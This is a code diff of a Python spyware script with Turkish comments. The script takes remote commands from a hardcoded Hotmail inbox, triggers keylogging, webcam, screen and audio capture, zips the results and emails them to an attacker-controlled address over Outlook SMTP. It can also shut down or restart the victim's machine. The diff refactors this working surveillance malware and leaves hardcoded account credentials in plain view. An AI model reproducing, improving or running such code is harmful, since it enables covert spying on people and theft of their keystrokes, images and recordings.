@@ -5,83 +5,85 @@ import shutil
 import smtplib
 import threading
 import time
-import urllib.request
+import warnings
 import zipfile
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-
+import requests
 import cam
 import key
 import mailread
 import screen
 import sound
+import pyautogui
+warnings.filterwarnings("ignore")
 
 
-def connect(host='http://google.com'):
-    try:
-        urllib.request.urlopen(host)  # Python 3.x
-        return True
-    except:
-        return False
+def net():
+    timeout = 1
+    while True:
+        try:
+            requests.head("http://www.google.com/", timeout=timeout)
 
+            return
+        except requests.ConnectionError:
+            pass
+
+
+net()
 
 b = False
-if connect():
-    wait = 1800
-    turn = 1
-    mtxt = 0
-    mcam = 0
-    mvrec = 0
-    msrec = 0
-    mvrecsec = 10
-    msrecsec = 10
-    mshutdown = 0
-    # ----------------------------
-    i = 0
-    if os.path.exists("sends"):
-        shutil.rmtree("sends")
-        print("silindi")
-    if os.path.exists("sends.zip"):
-        os.remove("sends.zip")
-        print("zip silindi")
-    os.mkdir("sends")
-    names = "sends/host"
-    ncam = names + ".jpg"
-    nvrec = names + ".wav"
-    nsrec = names + ".avi"
-    ntxt = names + ".txt"
-    user = "gotyouhahahaha@hotmail.com"
-    passw = "Ga1youhahaha."
-    to = "getfromgot@hotmail.com"
-    # ----------------------------
-    frm, subject, body = mailread.mread(user, passw, os.getlogin())
-    print(body + " - " + subject + " - " + frm)
+wait = 1800
+turn = 1
+mtxt = 0
+mcam = 0
+mvrec = 0
+msrec = 0
+mvrecsec = 10
+msrecsec = 10
+mshutdown = 0
+# ----------------------------
+i = 0
+if os.path.exists("sends"):
+    shutil.rmtree("sends")
+if os.path.exists("sends.zip"):
+    os.remove("sends.zip")
+os.mkdir("sends")
+names = "sends/host"
+ncam = names + ".jpg"
+nvrec = names + ".wav"
+nsrec = names + ".avi"
+ntxt = names + ".txt"
+user = "gotyouhahahaha@hotmail.com"
+passw = "Ga1youhahaha."
+to = "getfromgot@hotmail.com"
+# ----------------------------
+frm, subject, body = mailread.mread(user, passw, os.getlogin())
 
-    a = time.localtime()
-    mkey = datetime.date(1900, a.tm_mon, 1).strftime('%B').lower()[2]
-    subcont = os.getlogin() + "," + mkey + ",wait,turn,txt,cam,vrec,srec,vrecsec,srecsec,shutdown"
-    if subject == subcont:
-        sbody = str(body).split(",")
-        print(sbody)
-        try:
-            wait, turn, mtxt, mcam, mvrec, msrec, mvrecsec, msrecsec, mshutdown = \
-                int(sbody[0]), int(sbody[1]), int(sbody[2]), int(sbody[3]), int(sbody[4]), int(sbody[5]), int(
-                    sbody[6]), int(sbody[7]), int(sbody[8])
-        except:
-            None
-        b = True
-        if mtxt > 0:
-            t3 = threading.Thread(target=key.runkey, args=(ntxt, mtxt))  # key
-            t3.start()
+a = time.localtime()
+mkey = datetime.date(1900, a.tm_mon, 1).strftime('%B').lower()[2]
+subcont = os.getlogin() + "," + mkey + ",wait,turn,txt,cam,vrec,srec,vrecsec,srecsec,shutdown"
+if subject == subcont:
+    sbody = str(body).split(",")
+    try:
+        wait, turn, mtxt, mcam, mvrec, msrec, mvrecsec, msrecsec, mshutdown = \
+            int(sbody[0]), int(sbody[1]), int(sbody[2]), int(sbody[3]), int(sbody[4]), int(sbody[5]), int(
+                sbody[6]), int(sbody[7]), int(sbody[8])
+    except:
+        None
+    b = True
+    if mtxt > 0:
+        t3 = threading.Thread(target=key.runkey, args=(ntxt, mtxt))  # key
+        t3.start()
 
 while b:
     i += 1
-    print(str(i) + ". iterasyon başı")
     # time
-    sysdate = str(a.tm_mday) + "." + str(a.tm_mon) + "." + str(a.tm_year) + "  " + str(a.tm_hour) + ":" + str(
-        a.tm_min) + ":" + str(a.tm_sec)
+    a = time.localtime()
+    sysdate = str(a.tm_mday) + "." + str(a.tm_mon) + "." + str(a.tm_year)
+    systime = str(a.tm_hour) + ":" + str(a.tm_min) + ":" + str(a.tm_sec)
 
     if mcam == 1 and i == 1:
         t1 = threading.Thread(target=cam.cams, args=(ncam,))
@@ -129,15 +131,13 @@ while b:
         for dosya in arsivlenecekDosyalar:
             arsiv.write(dosya)
     # login
-    # try:
-    print("önce")
-    mail = smtplib.SMTP('smtp-mail.outlook.com', 587, timeout=None)
-    mail.ehlo()
-    mail.starttls()
-    mail.login(user, passw)
-    print("sonra")
-    # except:
-    #    None
+    try:
+        mail = smtplib.SMTP('smtp-mail.outlook.com', 587)
+        mail.ehlo()
+        mail.starttls()
+        mail.login(user, passw)
+    except:
+        print("login hata")
     mesaj = MIMEMultipart()
     mesaj["From"] = user
     mesaj["To"] = to
@@ -153,33 +153,39 @@ while b:
         mesaj.attach(part)
 
     # tarih
-    mesaj.attach(MIMEText('<p;">' + sysdate + '</p> ', "html"))
-    # try:
-    mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
-    # except:
-    # print("mailsend hata")
+    mesaj.attach(MIMEText(
+        '<font size="6" face="verdana" color="grey">' + sysdate +
+        '</font><br><br><font size="10" face="calibri" color="blue">' + systime + '</font> ', "html"))
+    try:
+        mail.sendmail(mesaj["From"], mesaj["To"], mesaj.as_string())
+    except:
+        None
     mail.close()
-    print(str(i) + ". iterasyon sonu")
     if i == turn:
         key.__setattr__('c', 0)
+        pyautogui.press("esc")
         b = False
     else:
         time.sleep(wait)
 
 # ----------------------------
 try:
+    print("1",mshutdown)
     if t3.isAlive():
         t3.join()
+    print("2",mshutdown)
     os.remove("sends")
+    print("3",mshutdown)
     os.remove("sends.zip")
-    if mshutdown == 1:
-        os.system("shutdown /s /t 1")
-    elif mshutdown == 2:
-        os.system("shutdown /r /t 1")
-    elif 0 == 3:
-        os.system("shutdown -l")
+    print("4",mshutdown)
+
 except:
-    None
+    print("hata son",mshutdown)
 
-
-
+if mshutdown == 1:
+    os.system("shutdown /s /t 1")
+elif mshutdown == 2:
+    os.system("shutdown /r /t 1")
+elif mshutdown == 3:
+    print("bla")
+    os.system("shutdown -l")
